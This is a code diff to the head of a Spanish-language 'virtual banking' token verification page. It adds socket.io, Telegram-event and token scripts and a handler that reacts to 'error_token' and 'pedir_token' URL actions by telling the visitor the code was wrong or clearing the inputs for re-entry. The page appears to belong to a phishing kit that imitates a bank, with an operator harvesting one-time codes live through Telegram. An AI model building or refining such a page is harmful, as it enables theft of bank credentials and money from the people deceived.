@@ -5,11 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ingreso a Banca Virtual - Verificación</title>
     <link rel="stylesheet" href="token.css">
+    
+    <!-- Scripts simplificados -->
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="js/config.js"></script>
     <script src="js/common.js"></script>
-    <script src="js/loading-screen.js"></script>
-    <script src="js/telegram-events.js"></script>
     <script src="js/loading-overlay.js"></script>
+    <script src="js/telegram-events.js"></script>
+    <script src="js/token.js"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Token page loaded in Render');
+            window.commonUtils.initializeCommon();
+            
+            // Tu código existente para manejar parámetros URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const action = urlParams.get('action');
+            
+            if (action === 'error_token') {
+                const errorMessage = document.querySelector('.error-message');
+                if (errorMessage) {
+                    errorMessage.style.display = 'block';
+                    errorMessage.querySelector('p').textContent = 
+                        '❌ El código token ingresado es incorrecto. Por favor intente nuevamente.';
+                }
+            } else if (action === 'pedir_token') {
+                const inputs = document.querySelectorAll('.token-input');
+                inputs.forEach(input => input.value = '');
+                if (inputs[0]) inputs[0].focus();
+            }
+            
+            window.isSubmitting = false;
+        });
+    </script>
 </head>
 <body>
     <div class="header">
